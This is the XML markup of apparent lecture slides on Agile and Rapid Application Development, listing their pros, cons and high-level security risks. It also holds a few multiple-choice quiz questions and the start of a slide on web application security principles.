    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11699221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B7711-8914-4C7F-A51C-99A8B3F2E5AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Agile development methodology</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{78785937-9DCD-0CCB-6659-E976C382D1E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1215750"/>
            <a:ext cx="4269007" cy="3388200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Agile is an iterative and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>incremental approach </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>to software development, focusing on flexibility, customer collaboration, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>frequent delivery of small, workable parts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> of the software. It encourages continuous feedback and adaptation to changing requirements.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{06115F13-DD7C-0A8A-8BCF-914C996F88E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:srcRect b="11846"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4989007" y="1294411"/>
            <a:ext cx="4104751" cy="3001259"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1669173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B7711-8914-4C7F-A51C-99A8B3F2E5AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Agile development methodology</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{78785937-9DCD-0CCB-6659-E976C382D1E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Pros:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>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Flexibility to changes</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Frequent delivery of software</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High customer collaboration</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Continuous feedback integration</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Focus on team collaboration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Cons:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>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Requires experienced team members</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Can be less predictable</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High customer involvement needed</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Difficult to measure progress</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29233417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018B3-E6EE-D2C8-4F4B-BBFA4EC8A7E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Risks in Agile Development Methodology</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BE46BB7C-D1D5-F409-9C4F-585B56D7EAC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Security Often Overlooked in Sprints</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Lack of Secure Design Thinking</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Incomplete or Evolving Requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Short sprint cycles for security testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Inconsistent Code Reviews due to Frequent Merges and Changes in Code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Frequent integration of open-source libraries increases the risk of supply chain vulnerabilities.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6506635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72DB0E-323F-EA7D-0D0B-A47B409D914F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="986281" y="2340480"/>
            <a:ext cx="7099160" cy="2357995"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED844A82-2A81-0044-3705-04598F5C9F59}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Rapid application development</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48F9A3CD-958B-1C61-32E2-20A35570F2BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>RAD is a software development methodology that emphasizes quick development and iteration of prototypes, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>with heavy user involvement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>. It </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>prioritizes speed and flexibility</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>, allowing for rapid adjustments based on user feedback. Provides </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>prototype</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> quickly and involve users for feedback.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21160086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44A82-2A81-0044-3705-04598F5C9F59}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Rapid application development</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48F9A3CD-958B-1C61-32E2-20A35570F2BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Pros:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>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Fast prototyping</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High user involvement</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Quick feedback and iteration</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Reduced development time</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Flexibility to changes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Cons:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>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Requires highly skilled developers</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Less focus on scalability</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Potential for incomplete documentation</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May result in lower quality due to speed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4332885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35F98-6F16-1707-60F3-4BAA252FCF89}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Attacks on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2800" dirty="0"/>
              <a:t>Rapid application development</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{11616ECE-6134-83C6-586B-868A0699B79C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Insecure Prototypes Released to Production</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Weak Input Validation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Lack of Formal Security Testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Poor Access Control due to fast iterations and limited testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RAD apps frequently use third-party APIs without proper validation or security.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Inadequate Logging and Monitoring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Frequent Deployment without Review</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="941866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5561A03-81FE-9A11-5013-7657B69BE8BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="741528"/>
            <a:ext cx="7704000" cy="3862422"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>What is a major security risk in the Waterfall development model?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>A. Frequent code changes introduce instability</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>B. Security is integrated at every sprint</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>C. Security issues are often discovered late in the cycle</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>D. It’s difficult to maintain documentation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36610455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4825C-13A4-6AA7-1601-BE3111DA526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7428B37-E7BE-6820-A310-1059246E0D97}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="741528"/>
            <a:ext cx="7704000" cy="3862422"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>In Agile development, which of the following increases the risk of vulnerabilities?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>A. Fixed project scope</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>B. Emphasis on user feedback</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>C. Short sprints with limited time for thorough security testing</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>D. Complete documentation before development begins</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23936322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846E9-D5E1-3F39-854D-28841225A16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46CBF26-2167-6CE6-5CCC-A17394883870}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="741528"/>
            <a:ext cx="7704000" cy="3862422"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>One risk of Waterfall methodology is that:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>A. It encourages iterative improvement</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>B. Late testing may fail to catch design-level flaws</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>C. Developers get frequent feedback from users</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>D. Security checks are performed after each sprint</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4197003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E441C-567A-5CA1-E238-7A07C27AF99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650DE19-85F0-ED02-B68E-A64559D726B5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="741528"/>
            <a:ext cx="7704000" cy="3862422"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>What makes Agile development more vulnerable to third-party dependency risks?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>A. It avoids using external libraries</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>B. It uses a Waterfall-based approach to vendor selection</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>C. Frequent updates and integrations without thorough vetting</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>D. Dependencies are manually tested before every sprint</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26509884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1F3FA-8A6B-051C-10AB-D76FC877651C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Web application security principles</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{818DA256-F885-8B04-0243-6BDFEBB50245}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Web application security principles are guidelines and best practices designed to protect web applications from security threats, vulnerabilities, and attacks. These principles help ensure the confidentiality, integrity, and availability of web applications and the data they handle. Here are some key web application security principles:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Secure data transmission</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Implement authentication and authorization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Manage sessions and cookies</a:t>
            </a:r>
          </a:p>
          <a:p>
